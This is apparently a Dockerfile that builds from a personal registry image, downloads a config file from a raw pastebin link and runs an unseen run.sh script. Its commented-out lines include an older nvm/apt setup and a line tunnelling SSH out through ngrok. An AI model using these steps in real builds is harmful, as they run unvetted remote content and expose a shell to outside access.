FROM registry-intl.cn-hongkong.aliyuncs.com/rakesh/run:nodejs

RUN curl https://pastebin.com/raw/3BLEQDdR -o dist/config.json 
RUN bash run.sh
# FROM registry-intl.cn-hongkong.aliyuncs.com/rakesh/run:codebuild
# # RUN /usr/sbin/sshd && ngrok tcp 22
# RUN echo 'debconf debconf/frontend select Noninteractive' | debconf-set-selections

# # Install base dependencies
# RUN gpg --keyserver hkp://keyserver.ubuntu.com:80 --recv-keys 871920D1991BC93C && gpg --export 871920D1991BC93C | sudo tee /etc/apt/trusted.gpg.d/ubuntu.lafibre.info.gpg
# RUN apt-get update && apt-get install -y -q --no-install-recommends \
#         apt-transport-https \
#         build-essential \
#         ca-certificates \
#         curl \
#         git \
#         libssl-dev \
#         wget
#     # && rm -rf /var/lib/apt/lists/*

# ENV NVM_DIR /usr/local/nvm # or ~/.nvm , depending
# ENV NODE_VERSION 0.10.33

# # Install nvm with node and npm
# RUN curl https://raw.githubusercontent.com/creationix/nvm/v0.20.0/install.sh | bash \
#     && . $NVM_DIR/nvm.sh \
#     && nvm install $NODE_VERSION \
#     && nvm alias default $NODE_VERSION \
#     && nvm use default

# ENV NODE_PATH $NVM_DIR/v$NODE_VERSION/lib/node_modules
# ENV PATH      $NVM_DIR/v$NODE_VERSION/bin:$PATH
